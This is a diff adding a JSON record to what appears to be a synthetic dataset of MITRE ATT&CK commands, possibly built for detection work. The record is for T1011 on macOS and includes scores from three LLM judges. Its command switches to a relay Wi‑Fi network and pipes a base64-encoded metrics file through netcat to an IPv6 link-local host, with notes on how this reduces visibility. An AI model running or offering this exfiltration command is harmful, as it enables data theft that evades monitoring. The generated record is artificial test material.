@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
+  "explanation": "Moves a JSON metrics file across an alternative Wi‑Fi SSID using IPv6 link-local addressing and a high, uncommon TCP port. Base64 encoding reduces casual visibility and the use of a separate medium satisfies T1011.",
+  "rationale_steps": [
+    "Clear any current Wi‑Fi association.",
+    "Join a relay SSID distinct from the primary network.",
+    "Base64-encode the file inline.",
+    "Send via IPv6 link-local constrained to the Wi‑Fi interface on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-c2421240",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with correct chaining (&& and |), balanced quoting, valid paths/flags, and a properly scoped IPv6 link-local address.",
+        "semantic_score": 3,
+        "semantic_justification": "While it aligns with T1011 by attempting to switch to an alternate Wi-Fi SSID and exfiltrate via IPv6 netcat, the networksetup step typically requires root and lacks sudo here, likely preventing the join and subsequent exfiltration.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:34:52.690230Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with properly balanced quotes, valid use of &&, pipe operators, and correct flag syntax for all tools including airport, networksetup, openssl, and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "The command plausibly implements T1011 by disassociating from the current Wi-Fi network, joining an alternative SSID, and exfiltrating base64-encoded JSON data over IPv6 link-local addressing via netcat on an uncommon port, though the IPv6 link-local address with scope ID requires the target to be on the same local segment and the 'None' privilege level is inconsistent with the sudo usage and networksetup requiring admin rights.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:11:23.715189Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct syntax for chaining multiple macOS utilities and tools like openssl and nc with valid flags and quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates T1011 by disassociating from the current network, joining a specific exfiltration SSID, and transmitting encoded data via a targeted IPv6 address.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:11:26.032111Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
